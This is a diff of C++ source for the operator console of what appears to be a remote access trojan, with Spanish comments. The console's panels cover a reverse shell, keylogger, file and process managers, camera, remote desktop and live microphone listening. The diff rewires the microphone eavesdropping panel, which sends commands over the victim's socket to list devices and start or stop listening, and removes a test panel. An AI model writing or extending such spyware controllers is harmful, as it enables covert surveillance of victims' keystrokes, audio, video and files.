@@ -2,6 +2,7 @@
 #include "frame_remote_desktop.hpp"
 #include "panel_file_manager.hpp"
 #include "panel_process_manager.hpp"
+#include "panel_microfono.hpp"
 #include "panel_reverse_shell.hpp"
 #include "panel_keylogger.hpp"
 #include "panel_camara.hpp"
@@ -12,7 +13,6 @@ extern Servidor* p_Servidor;
 extern std::mutex vector_mutex;
 
 wxBEGIN_EVENT_TABLE(FrameCliente, wxFrame)
-    EVT_BUTTON(EnumIDS::ID_FrameClienteTest, FrameCliente::OnTest)
     EVT_CLOSE(FrameCliente::OnClose)
     EVT_AUINOTEBOOK_PAGE_CLOSE(wxID_ANY, FrameCliente::OnClosePage)
 wxEND_EVENT_TABLE()
@@ -117,13 +117,10 @@ void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
     event.Skip();
 }
 
-void FrameCliente::OnTest(wxCommandEvent& event) {
-    return;
-}
-
 void FrameCliente::OnClose(wxCloseEvent& event) {
     int iIndex = p_Servidor->IndexOf(this->strClienteID);
 
+    //Talvez remplazar este por uno que cierre todos los modulos que estan corriendo?
     if (iIndex != -1) {
         p_Servidor->vc_Clientes[iIndex]->m_setFrameVisible(false);
         p_Servidor->cChunkSend(this->sckCliente, "exit\r\n", 6, 0, false, EnumComandos::Reverse_Shell_Command);
@@ -136,6 +133,11 @@ void FrameCliente::OnClose(wxCloseEvent& event) {
 void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
     wxTreeItemId itemID = event.GetItem();
     wxString wStr = GetItemText(itemID);
+    FrameCliente* temp_frame = (FrameCliente*)this->GetParent();
+    SOCKET temp_socket = INVALID_SOCKET;
+    if (temp_frame) {
+        temp_socket = temp_frame->sckCliente;
+    }
 
     bool isFound = false;
     //Si el panel/frame ya esta abierto solo hacer focus
@@ -150,9 +152,7 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
     if (wStr[0] != '[' && isFound == false) {
         this->p_Notebook->Freeze();
 
-        if (wStr == "Testing") {
-            this->p_Notebook->AddPage(new panelTest(this), wStr, true);
-        } else if (wStr == "Reverse Shell") {
+        if (wStr == "Reverse Shell") {
             this->p_Notebook->AddPage(new panelReverseShell(this), wStr, true);
         } else if (wStr == "Admin de Archivos") {
             this->p_Notebook->AddPage(new panelFileManager(this), wStr, true);
@@ -161,7 +161,7 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
         } else if (wStr == "Keylogger") {
             this->p_Notebook->AddPage(new panelKeylogger(this), wStr, true);
         } else if (wStr == "Microfono") {
-            this->p_Notebook->AddPage(new panelMicrophone(this), wStr, true);
+            this->p_Notebook->AddPage(new panelMicrophone(this,temp_socket), wStr, true);
         } else if (wStr == "Camara") {
             this->p_Notebook->AddPage(new panelCamara(this), wStr, true);
         }else if (wStr == "Escritorio Remoto") {
@@ -171,91 +171,4 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
 
         this->p_Notebook->Thaw();
     } 
-}
-
-
-//-----------------Modulos-----------------//
-// MIGRAR para archivos separados
-
-//Test
-panelTest::panelTest(wxWindow* pParent) :
-    wxPanel(pParent, EnumIDS::ID_Panel_Test) {
-    wxButton* btn_Test = new wxButton(this, EnumIDS::ID_FrameClienteTest, "EXEC");
-    this->lblOutputTest = new wxStaticText(this, EnumIDS::ID_Panel_Label_Test, wxT("Output"), wxPoint(20, 20));
-}
-
-//Microfono
-panelMicrophone::panelMicrophone(wxWindow* pParent) :
-    wxPanel(pParent, EnumIDS::ID_Panel_Microphone) {
-
-    //Otener el ID del cliente directo del padre
-    wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
-    if (wxTree) {
-        wxPanel* panel_cliente = (wxPanel*)wxTree->GetParent();
-        if (panel_cliente) {
-            FrameCliente* frame_cliente = (FrameCliente*)panel_cliente->GetParent();
-            if (frame_cliente) {
-                this->strID = frame_cliente->strClienteID;
-                this->sckSocket = frame_cliente->sckCliente;
-            }
-        }
-    }
-
-    this->SetBackgroundColour(wxColor(200, 200, 200));
-
-    
-    wxBoxSizer* main_sizer = new wxBoxSizer(wxVERTICAL);    
-    wxBoxSizer* row_sizer1 = new wxBoxSizer(wxHORIZONTAL);
-    wxBoxSizer* row_sizer2 = new wxBoxSizer(wxHORIZONTAL);
-
-    
-
-    this->mic_devices = new wxComboBox(this, EnumIDS::ID_Panel_Mic_CMB_Devices, "...", wxDefaultPosition, wxSize(200, 20));
-    wxButton* mic_refresh_devices = new wxButton(this, EnumIDS::ID_Panel_Mic_BTN_Refresh, "Refrescar lista");
-    wxStaticText* lbl1 = new wxStaticText(this, wxID_ANY, "Dispositivos: ");
-
-    row_sizer1->Add(lbl1, 0, wxALL, 1);
-    row_sizer1->Add(this->mic_devices, 1, wxALL, 1);
-    row_sizer1->Add(mic_refresh_devices, 1, wxALL, 1);
-
-    main_sizer->Add(row_sizer1, 0, wxALL, 1);
-
-    wxButton* mic_start_live = new wxButton(this, EnumIDS::ID_Panel_Mic_BTN_Escuchar, "Escuchar");
-    wxButton* mic_start_rec = new wxButton(this, EnumIDS::ID_Panel_Mic_BTN_Detener, "Detener");
-    
-    row_sizer2->Add(mic_start_live, 0, wxALL, 1);
-    row_sizer2->Add(mic_start_rec, 0, wxALL, 1);
-
-    main_sizer->Add(row_sizer2, 0, wxALL, 1);
-
-    this->SetSizer(main_sizer);
-
-}
-
-void panelMicrophone::OnRefrescarDispositivos(wxCommandEvent& event) {
-    std::string strComando = DUMMY_PARAM;
-    this->EnviarComando(strComando, EnumComandos::Mic_Refre_Dispositivos);
-}
-
-void panelMicrophone::OnEscuchar(wxCommandEvent& event) {
-    
-    wxString str_device_id = this->mic_devices->GetStringSelection();
-    
-    //Quien tiene mas de 10 microfonos :v ?
-    std::string strComando = "";
-    strComando.append(1, str_device_id[1]);
-
-    this->EnviarComando(strComando, EnumComandos::Mic_Iniciar_Escucha);
-}
-
-void panelMicrophone::OnDetener(wxCommandEvent& event) {
-    std::string strComando = DUMMY_PARAM;
-    this->EnviarComando(strComando, EnumComandos::Mic_Detener_Escucha);
-
-    int iIndex = p_Servidor->IndexOf(this->strID);
-    p_Servidor->vc_Clientes[iIndex]->ClosePlayer();
-}
-
-void panelMicrophone::EnviarComando(std::string pComando, int iComando) {
-    p_Servidor->cChunkSend(this->sckSocket, pComando.c_str(), pComando.size() + 1, 0, false, iComando);
 }
